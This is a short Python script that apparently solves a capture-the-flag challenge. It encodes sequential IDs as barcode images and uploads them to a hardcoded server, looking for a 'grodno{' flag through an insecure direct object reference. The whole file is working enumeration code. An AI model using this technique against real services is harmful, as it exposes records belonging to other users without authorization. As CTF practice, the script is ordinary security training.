import requests
import barcode
from barcode.writer import ImageWriter
import io 
from bs4 import BeautifulSoup 

# generate_barcode
url = "http://185.219.81.19:5678/get"

barcode_format = "code128" 
writer=ImageWriter()

def generate_barcode(i):
    img_buffer = io.BytesIO()
    barcode_obj = barcode.get(barcode_format, i, writer=writer)
    barcode_obj.write(img_buffer)
    img_buffer.seek(0)
    return img_buffer

def upload(i):
    img_buffer = generate_barcode(i)
    files = {"file": (f"xnw_barcode{i}.png", img_buffer, "image/png")}
    resp = requests.post(url, files=files)

    soup = BeautifulSoup(resp.text, 'html.parser')
    try:
        content = soup.find('p').get_text()
        return content
    except Exception:
        return "error!"
    
# idor :generate barcode with incrementing id 0-10
for i in range(10):
    resp = upload(str(i))
    print(f"{i}: {resp}")
    if "grodno{" in resp:
        print(f"flag found!!!")